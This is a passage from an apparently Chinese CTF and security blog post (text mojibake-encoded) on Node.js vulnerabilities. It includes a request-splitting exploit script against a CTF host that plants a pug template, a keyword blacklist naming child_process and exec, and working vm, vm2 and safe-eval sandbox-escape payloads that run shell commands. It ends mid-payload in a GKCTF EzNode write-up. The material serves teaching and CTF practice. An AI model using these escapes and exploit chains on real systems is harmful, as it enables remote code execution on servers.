const multer = require(&#39;multer&#39;); // ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½

// å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„ 
app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); 
// ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿— 
app.use(morgan(&#39;short&#39;));  

// é™æ€æ–‡ä»¶è·¯ç”± 
app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) 
app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  
app.get(&#39;/&#39;, function (req, res) &#123;    
  // GETæ–¹æ³•è·å–actionå‚æ•°    
  var action = req.query.action ? req.query.action : &quot;index&quot;;    
  // actionä¸­ä¸èƒ½åŒ…å«/ &amp; \    
  if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;        
    res.send(&quot;Errrrr, You have been Blocked&quot;);    
  &#125;    
  
  // å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•    
  file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);    
  var html = pug.renderFile(file);    
  res.send(html); 
&#125;);  

app.post(&#39;/file_upload&#39;, function (req, res) &#123;    
  var ip = req.connection.remoteAddress; // remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥    
  var obj = &#123;msg: &#39;&#39;,&#125;    
  // è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost    
  if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;        
    obj.msg = &quot;only admin&#39;s ip can use it&quot;        
    res.send(JSON.stringify(obj));        
    return    
  &#125;    
  fs.readFile(req.files[0].path, function (err, data) &#123;        
    if (err) &#123;            
      obj.msg = &#39;upload failed&#39;;            
      res.send(JSON.stringify(obj));        
    &#125; else &#123;            
      // æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢            
      var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;            
      var file_name = req.files[0].originalname            
      var dir_file = __dirname + file_path + file_name            
      if (!fs.existsSync(__dirname + file_path)) &#123;                
        try &#123;                    
          fs.mkdirSync(__dirname + file_path)                
        &#125; catch (error) &#123;                    
          obj.msg = &quot;file type error&quot;;                    
          res.send(JSON.stringify(obj));                    
          return                
        &#125;            
      &#125;            
      try &#123;                
        fs.writeFileSync(dir_file, data)                
        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;            
      &#125; catch (error) &#123;                
        obj.msg = &#39;upload failed&#39;;            
      &#125;            
      res.send(JSON.stringify(obj));        
    &#125;    
  &#125;) 
&#125;)  

// æŸ¥çœ‹é¢˜ç›®æºç  
app.get(&#39;/source&#39;, function (req, res) &#123;    
  res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  
app.get(&#39;/core&#39;, function (req, res) &#123;    
  var q = req.query.q;    
  var resp = &quot;&quot;;    
  if (q) &#123;        
    var url = &#39;http://localhost:8081/source?&#39; + q        
    console.log(url)        
   
    // å¯¹urlå­—ç¬¦è¿›è¡Œwaf        
    var trigger = blacklist(url);        
    if (trigger === true) &#123;            
      res.send(&quot;error occurs!&quot;);        
    &#125; else &#123;            
      try &#123;                
      
        // nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç ´åè¿›è¡Œåˆ‡åˆ†æ”»å‡»è®¿é—®/file_uploadè·¯ç”±(â—ï¸æ­¤è¯·æ±‚å‘å‡ºè€…ä¸ºlocalhostä¸»æœº)ï¼Œå®ç°å¯¹remoteAddressçš„ç»•è¿‡                
        http.get(url, function (resp) &#123;                    
          resp.setEncoding(&#39;utf8&#39;);                    
          resp.on(&#39;error&#39;, function (err) &#123;                        
            if (err.code === &quot;ECONNRESET&quot;) &#123;                            
              console.log(&quot;Timeout occurs&quot;);                        
            &#125;                    
          &#125;);                    
          
          // è¿”å›ç»“æœè¾“å‡ºåˆ°/core                    
          resp.on(&#39;data&#39;, function (chunk) &#123;                        
            try &#123;                            
              resps = chunk.toString();                            
              res.send(resps);                        
            &#125; catch (e) &#123;                            
              res.send(e.message);                        
            &#125;                    
          &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                        
            res.send(e.message);                    
          &#125;);                
        &#125;);            
      &#125; catch (error) &#123;                
        console.log(error);            
      &#125;        
    &#125;    
  &#125; else &#123;        
    res.send(&quot;search param &#39;q&#39; missing!&quot;);    
  &#125; 
&#125;)  
// å…³é”®å­—waf åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å®ç°ç»•è¿‡ 
function blacklist(url) &#123;    
  var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];    
  var arrayLen = evilwords.length;     
  for (var i = 0; i &lt; arrayLen; i++) &#123;        
    const trigger = url.includes(evilwords[i]);        
    if (trigger === true) &#123;            
      return true        
    &#125;    
  &#125; 
&#125;  
var server = app.listen(8081, function () &#123;    
  var host = server.address().address    
  var port = server.address().port    
  console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) 
&#125;)
</code></pre>
<p><strong>exp:</strong></p>
<pre><code class="plsql">import requests

payload = &quot;&quot;&quot; HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive

POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: &#123;&#125;
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt

&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)

body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;
Content-Type: ../template

-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)
-return x
------WebKitFormBoundarysAs7bV3fMHq0JXUt--

&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)

payload = payload.format(len(body), body) \
    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \
    .replace(&#39; &#39;, &#39;\u0120&#39;)             \
    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \
    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \
    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \
    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \
    .replace(&#39;]&#39;, &#39;\u015d&#39;) \
    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;

session = requests.Session()
session.trust_env = False
response1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)
response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)
print(response.text)
</code></pre>
<h1 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h1><h2 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><strong>context</strong><br> vm æ¨¡å—åˆ›å»ºä¸€ä¸ªV8è™šæ‹Ÿå¼•æ“ contextï¼ˆä¸Šä¸‹æ–‡ã€ç¯å¢ƒï¼‰æ¥ç¼–è¯‘å’Œè¿è¡Œä»£ç ã€‚  </p>
<pre><code class="plsql">context æ˜¯è¯­å¢ƒã€ç¯å¢ƒã€ä¸Šä¸‹æ–‡çš„æ„æ€ï¼Œç±»ä¼¼äºæ–‡ç« çš„è¯­å¢ƒï¼Œä¸€å¥è¯çš„æ„æ€éœ€è¦æ ¹æ®è¯­å¢ƒæ¨æ–­ï¼Œå³æ–‡ç« çš„ä¸Šä¸‹æ–‡ã€‚ä»¥æ­¤ç±»æ¯”ï¼Œè¿™é‡Œçš„ context æ˜¯ JavaScript ä»£ç æ‰€å¤„çš„ç¯å¢ƒï¼ˆæœ‰ç‚¹åƒä½œç”¨åŸŸçš„æ¦‚å¿µï¼‰ï¼Œä¸€æ¡ä»£ç è¯­å¥åœ¨ä¸åŒçš„ç¯å¢ƒæ‰§è¡Œçš„ç»“æœä¹Ÿä¸åŒã€‚
</code></pre>
<p>è°ƒç”¨ä»£ç ä¸è¢«è°ƒç”¨ä»£ç å¤„äºä¸åŒçš„ contextï¼Œæ„å‘³ç€å®ƒä»¬çš„ global å¯¹è±¡æ˜¯ä¸åŒçš„ã€‚<br>ä¾‹å­ï¼š</p>
<pre><code class="plsql">const vm = require(&#39;vm&#39;);

// globalä¸‹å®šä¹‰ä¸€ä¸ª x å˜é‡
const x = 1;

// contextä¹Ÿå®šä¹‰ä¸€ä¸ª x å˜é‡
const context = &#123; x: 2 &#125;;
vm.createContext(context);          // è¯­å¢ƒåŒ– &#123;x:2&#125;

// codeåŒ…å«çš„ä»£ç å°†åœ¨ context ä¸‹æ‰§è¡Œï¼Œæ‰€ä»¥å…¶ä¸­æ‰€æœ‰ä»£ç è®¿é—®çš„å˜é‡éƒ½æ˜¯ context ä¸‹çš„
const code = &#39;x += 40; var y = 17;&#39;;
vm.runInContext(code, context);

// context = &#123;x:42, y:17&#125;
console.log(context.x); // 42
console.log(context.y); // 17

// globalæ²¡æœ‰è¢«æ”¹åŠ¨
console.log(x); // 1; y is not defined.
</code></pre>
<p> codeæ‰§è¡Œçš„ç¯å¢ƒæ˜¯ context ï¼Œå®ƒè®¿é—®çš„å…¨å±€å¯¹è±¡å°±æ˜¯è®¿é—®è‡ªå®šä¹‰çš„ context å¯¹è±¡ã€‚<br><strong>contextify è¯­å¢ƒåŒ–</strong><br> æ ¹æ® V8 å¼•æ“çš„æ–‡æ¡£æŒ‡æ˜ï¼š  </p>
<pre><code class="plsql">åœ¨ V8 ä¸­ï¼Œcontext æ˜¯ä¸€ä¸ªæ‰§è¡Œç¯å¢ƒï¼Œå®ƒå…è®¸åœ¨éš”ç¦»çš„ã€æ— å…³è”çš„ä¸€ä¸ª V8 å®ä¾‹ä¸­è¿è¡Œ JavaScript åº”ç”¨ã€‚ä½ å¿…é¡»ä¸ºè¿è¡Œçš„ä»»ä½•JavaScriptä»£ç æŒ‡å®šæ‰€åº”è¯¥å¤„äºçš„ contextã€‚
</code></pre>
<p>vm.createContext() æœ‰ä¸€ä¸ª contextobject å‚æ•°ï¼Œç”¨äºæ¥æ”¶ä¸€ä¸ªå¯¹è±¡ï¼ˆå¦‚æœæ²¡æœ‰ï¼Œå°±åœ¨æ¨¡å—å†…éƒ¨åˆ›å»ºä¸€ä¸ªï¼‰ï¼Œæ‰€è°“è¯­å¢ƒåŒ–å°±æ˜¯åˆ›å»ºä¸€ä¸ª contextï¼ˆå¯¹è±¡ï¼‰ ç„¶åä¼ å…¥ contextObject ä½œä¸ºä»£ç æ‰§è¡Œç¯å¢ƒçš„è¿‡ç¨‹ã€‚  </p>
<h2 id="vmé€ƒé€¸"><a href="#vmé€ƒé€¸" class="headerlink" title="vmé€ƒé€¸"></a>vmé€ƒé€¸</h2><p>vmåˆ›å»ºä¸€ä¸ªæ–°çš„ context æ‰§è¡Œ JavaScript ä»£ç ï¼Œä¸èƒ½è®¿é—® global å¯¹è±¡ï¼Œçœ‹èµ·æ¥å°±åƒä¸€ä¸ªæ²™ç®±äº†ã€‚<br>ä¾‹å¦‚æˆ‘ä»¬æƒ³è¦è®¿é—® processï¼š</p>
<pre><code class="plsql">&quot;use strict&quot;;
const vm = require(&quot;vm&quot;);
const xyz = vm.runInNewContext(`process`);   // é»˜è®¤ context = &#123;&#125;
console.log(xyz);
</code></pre>
<p>ç»“æœ:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> é¢„æ–™ä¹‹ä¸­ï¼Œå› ä¸º process ä¸å­˜åœ¨äºæ–°çš„ contextï¼Œå®ƒå­˜åœ¨äºåŸæ¥çš„ context ä¸­ï¼Œè€ŒåŸæ¥çš„ context çš„ global å¯¹è±¡æœ‰ process å±æ€§ï¼š  </p>
<pre><code class="plsql">&quot;use strict&quot;;
console.log(process)
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> é€šè¿‡å¯¹è±¡å¸¦æœ‰çš„ constructor å±æ€§é€ƒé€¸:</p>
<pre><code class="plsql">&quot;use strict&quot;;
const vm = require(&quot;vm&quot;);
const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);
console.log(xyz);  // xyzçš„å€¼ä¸ºæœ€åä¸€å¥JavaScriptä»£ç æ‰§è¡Œçš„ç»“æœï¼Œè¿™é‡Œæ˜¯å‡½æ•°è¿”å›å€¼
</code></pre>
<p>ç»“æœ:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>thiså¼•ç”¨çš„æ˜¯å½“å‰æ‰€åœ¨çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œæ˜¯ä¼ å…¥ contextObject çš„å¯¹è±¡ï¼Œå®ƒåœ¨å¤–éƒ¨å®šä¹‰ï¼Œæ‰€ä»¥å®ƒå±äºå¤–éƒ¨çš„ contextã€‚é€šè¿‡ .constructor å¾—åˆ° Object Contrustor ï¼Œå†é€šè¿‡ .constructor å¾—åˆ° Function constructorï¼Œè¿™æ˜¯å‡½æ•°çš„æ„é€ å‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥ä¸€ä¸ªåŒ…å«ä»£ç çš„å­—ç¬¦ä¸²å‚æ•°å°±èƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œæœ€åçš„ () å°±æ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚<br>è·å¾— process ä¹‹åå°±èƒ½ RCE äº†ã€‚</p>
<pre><code class="plsql">&quot;use strict&quot;;
const vm = require(&quot;vm&quot;);
const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();
process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);
console.log(xyz);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p>
<h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js å†…ç½®çš„ vm æ¨¡å—æä¾›çš„æ²™ç®±ç¯å¢ƒçš„éš”ç¦»ç¨‹åº¦ä¸é«˜ï¼Œå› æ­¤æœ€å¥½ä¸è¦æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ï¼Œè¿™ä¸€ç‚¹åœ¨node.jsæ–‡æ¡£ä¸­æ˜ç¡®æŒ‡å‡ºã€‚<br>vm2æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼ŒåŸºäºvmæ¨¡å—ã€Proxyç‰¹æ€§ã€requireé‡å†™æ¥å®ç°ï¼Œèƒ½æä¾›éš”ç¦»ç¨‹åº¦æ›´é«˜çš„æ²™ç®±ã€‚<br> vmçš„ä¾‹å­åœ¨vm2è¿è¡Œï¼š  </p>
<pre><code class="plsql">&quot;use strict&quot;;
const &#123;VM&#125; = require(&#39;vm2&#39;);
new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> è¿™æ¬¡é€šè¿‡ this.constructor.constructor ä¹Ÿä¸èƒ½è·å– process äº†ã€‚è¿™æ˜¯ç”±äº vm2 è¯­å¢ƒåŒ–äº†åœ¨ vm context ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œ.constructoræŒ‡å‘çš„æ„é€ å‡½æ•°å¹¶ä¸æ˜¯å¤–éƒ¨çš„ context ã€‚  </p>
<pre><code class="plsql">// vm
&quot;use strict&quot;;
const vm = require(&quot;vm&quot;);
const xyz = vm.runInNewContext(`this.constructor.constructor`);
console.log(xyz)                       // Function: Function
console.log(xyz === &#123;&#125;.constructor.constructor);       // true

// vm2
&quot;use strict&quot;;
const &#123;VM&#125; = require(&#39;vm2&#39;);
const xyz = new VM().run(&#39;this.constructor.constructor&#39;);
console.log(xyz)                       // Function: Function
console.log(xyz === &#123;&#125;.constructor.constructor)        // false
</code></pre>
<p><strong>vm2é€ƒé€¸æ€è·¯</strong><br>é€ƒé€¸çš„æ€è·¯ï¼šæˆ‘ä»¬éœ€è¦ä¸€äº›æ²™ç®±å¤–çš„ä¸œè¥¿ï¼Œå®ƒä¸åœ¨æ²™ç®± context çš„é™åˆ¶èŒƒå›´å†…ï¼Œé€šè¿‡å®ƒå°±èƒ½å†æ¬¡è®¿é—® constructor ã€‚<br>**1.å¼‚å¸¸å¤„ç†æœºåˆ¶ try catch å°±èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œä¸»è¿›ç¨‹åœ¨ try æŠ›å‡ºå¼‚å¸¸ï¼Œç„¶ååœ¨ catch æ•è· error å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ª error å¯¹è±¡å¼•ç”¨åˆ° process **</p>
<pre><code>vm2 å°†è¯¥æ¼æ´å·²ä¿®å¤
</code></pre>
<pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); 
nvm = new NodeVM()

nvm.run(`
    try &#123;
        this.process.removeListener(); 
    &#125; 
    catch (host_exception) &#123;
        console.log(&#39;host exception: &#39; + host_exception.toString());
        // é€šè¿‡ error å¯¹è±¡å¼•ç”¨
        host_constructor = host_exception.constructor.constructor;
        host_process = host_constructor(&#39;return this&#39;)().process;
    child_process = host_process.mainModule.require(&quot;child_process&quot;);
    console.log(child_process.execSync(&quot;whoami&quot;).toString());
    &#125;`);
</code></pre>
<p> ç»“æœï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>å…¶ä»–å¾—ä¸€äº›payload</p>
<pre><code class="plsql">var handler = &#123;
    get () &#123;
     console.log(&quot;get&quot;);
    &#125;
  &#125;;
var target = &#123;&#125;;
var proxy = new Proxy(target, handler);

Object.prototype.has = function(t, k)&#123;
    console.log(&quot;has&quot;);
&#125;

proxy.a; //è§¦å‘get
&quot;&quot; in proxy; //è§¦å‘hasï¼Œè¿™ä¸ªhasæ˜¯åœ¨åŸå‹é“¾ä¸Šå®šä¹‰çš„w
</code></pre>
<p>========================================</p>
<pre><code class="plsql">&quot;use strict&quot;;

var process;

Object.prototype.has = function (t, k) &#123;
    process = t.constructor(&quot;return process&quot;)();
&#125;;

&quot;&quot; in Buffer.from;
process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
</code></pre>
<h2 id="safe-evalæ¨¡å—é€ƒé€¸"><a href="#safe-evalæ¨¡å—é€ƒé€¸" class="headerlink" title="safe-evalæ¨¡å—é€ƒé€¸"></a>safe-evalæ¨¡å—é€ƒé€¸</h2><p> safe-eval ç¬¬ä¸‰æ–¹æ¨¡å—åŸºäºå†…ç½®æ¨¡å— vm å®ç°ï¼Œå¯ä»¥ç”¨äºæ‰§è¡Œ JavaScript ä»£ç ï¼Œé»˜è®¤èƒ½è®¿é—® V8 å¼•æ“çš„ JavaScript APIsï¼Œè€Œä¸èƒ½è®¿é—® node.js çš„ APIsï¼Œä½†é€šè¿‡ä¼ å…¥ context ä¹Ÿèƒ½å®ç°å¯¹å®ƒä»¬çš„è®¿é—®ã€‚  </p>
<pre><code class="plsql">safeEval(code, [context], [options])
</code></pre>
<p> context æ˜¯ä¸€ä¸ªåŒ…å«å±æ€§å’Œæ–¹æ³•çš„å¯¹è±¡ï¼Œè¿™äº›æ–¹æ³•å’Œå±æ€§ä»å…¨å±€ï¼Œæ‰€ä»¥è¦æ³¨æ„ä¼ å…¥çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¦åˆ™ä¼šé€ æˆæ²™ç®±é€ƒé€¸ã€‚<br> åœ¨ version &lt;= 0.3.0 ä¸­ï¼Œsafe-eval å­˜åœ¨æ²™ç®±é€ƒé€¸çš„æ¼æ´ï¼š  </p>
<pre><code class="plsql">&gt;npm i safe-eval@0.3.0
</code></pre>
<pre><code class="plsql">// test.js
const safeEval = require(&#39;safe-eval&#39;)
var code = `
    this.constructor.constructor(&#39;return process&#39;)()
`
var evaluated = safeEval(code)
console.log(evaluated)            // process [....]
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 çš„ä¿®è¡¥æ–¹æ³•æ˜¯å°†å¯¹è±¡çš„ constructor é‡æ–°å®šä¹‰ä¸º undefinedï¼ŒåŒ…æ‹¬åœ¨ context ä¼ å…¥çš„å¯¹è±¡ï¼š  </p>
<pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)

var code = &#39;this.constructor&#39;
var evaluated = safeEval(code)      
console.log(evaluated)             // undefined

var code = &#39;a&#39;
var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)
console.log(evaluated2)           // &#123;constructor: undefined&#125;
</code></pre>
<p><strong>safe-eval  1.3.6  ç‰ˆæœ¬é€ƒé€¸</strong></p>
<pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);

const theFunction = function () &#123;
  const process = clearImmediate.constructor(&quot;return process;&quot;)();
  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
&#125;;
const untrusted = `($&#123;theFunction&#125;)()`;

console.log(saferEval(untrusted));
</code></pre>
<p>payload:</p>
<pre><code class="plsql">(function () &#123;

const process = clearImmediate.constructor(&quot;return process;&quot;)();

return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()
</code></pre>
<h2 id="ctfé¢˜ç›®"><a href="#ctfé¢˜ç›®" class="headerlink" title="ctfé¢˜ç›®"></a>ctfé¢˜ç›®</h2><h3 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzNode"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode</h3><p>é“¾æ¥:<a target="_blank" rel="noopener" href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>è¿™é‡Œä½¿ç”¨dockeræ­å»º<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p>
<p>æˆ‘ä»¬æŸ¥çœ‹ä¸‹æºä»£ç :</p>
<pre><code class="plsql">const express = require(&#39;express&#39;);
const bodyParser = require(&#39;body-parser&#39;);

const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“

const fs = require(&#39;fs&#39;);

const app = express();


app.use(bodyParser.urlencoded(&#123; extended: false &#125;));
app.use(bodyParser.json());

// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–
app.use((req, res, next) =&gt; &#123;
  if (req.path === &#39;/eval&#39;) &#123;
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) &#123;
      delay = Math.max(delay, parseInt(req.query.delay));
    &#125;
    const t = setTimeout(() =&gt; next(), delay);
    // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹
    setTimeout(() =&gt; &#123;
      clearTimeout(t);
      console.log(&#39;timeout&#39;);
      try &#123;
        res.send(&#39;Timeout!&#39;);
      &#125; catch (e) &#123;

      &#125;
    &#125;, 1000);
  &#125; else &#123;
    next();
  &#125;
&#125;);

app.post(&#39;/eval&#39;, function (req, res) &#123;
  let response = &#39;&#39;;
  if (req.body.e) &#123;
    try &#123;
      response = saferEval(req.body.e);
    &#125; catch (e) &#123;
      response = &#39;Wrong Wrong Wrong!!!!&#39;;
    &#125;
  &#125;
  res.send(String(response));
&#125;);

// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI
app.get(&#39;/source&#39;, function (req, res) &#123;
  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.js&#39;));
&#125;);

// 2019.12/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£
app.get(&#39;/version&#39;, function (req, res) &#123;
  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./package.json&#39;));
&#125;);

app.get(&#39;/&#39;, function (req, res) &#123;
  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
  res.send(fs.readFileSync(&#39;./index.html&#39;))
&#125;)

app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;
  console.log(&#39;Start listening&#39;)
&#125;);
</code></pre>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>åœ¨è¿™æ®µä»£ç ä¸­å­˜åœ¨safe-evalï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹å®ƒå¾—ç‰ˆæœ¬<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6æ˜¯å­˜åœ¨æ¼æ´çš„<br>æˆ‘ä»¬å…ˆç»§ç»­åˆ†æä»£ç :<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> é€šè¿‡/eval?delay=ä¸Šä¼ ä¸€ä¸ªæ•°å­—å¹¶å’Œ60000æ¯”è¾ƒï¼Œå¤§çš„èµ‹å€¼ç»™delay  </p>
<pre><code class="plsql">setTimeoutæœ€å¤šåªèƒ½æ¨è¿Ÿæ‰§è¡Œ2147483647æ¯«ç§’ï¼ˆ24.8å¤©ï¼‰ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå‘ç”Ÿæº¢å‡ºï¼Œå¯¼è‡´å›è°ƒå‡½æ•°å°†åœ¨å½“å‰ä»»åŠ¡é˜Ÿåˆ—ç»“æŸåç«‹å³æ‰§è¡Œ
</code></pre>
<p> æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¤§äº2147483647çš„å€¼å³å¯æ‰§è¡Œnext()åˆ°ä¸‹ä¸€ä¸ªä½ç½®<br>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡getä¼ å…¥ä¸€ä¸ªæ¯”2147483647å¤§çš„å€¼ï¼Œç„¶å¹´ä½¿ç”¨postæ–¹å¼ä¼ å…¥payload<br>safer-eval 1.3.6é€ƒé€¸payload:</p>
<pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);

const theFunction = function () &#123;
  const process = clearImmediate.constructor(&quot;return process;&quot;)();
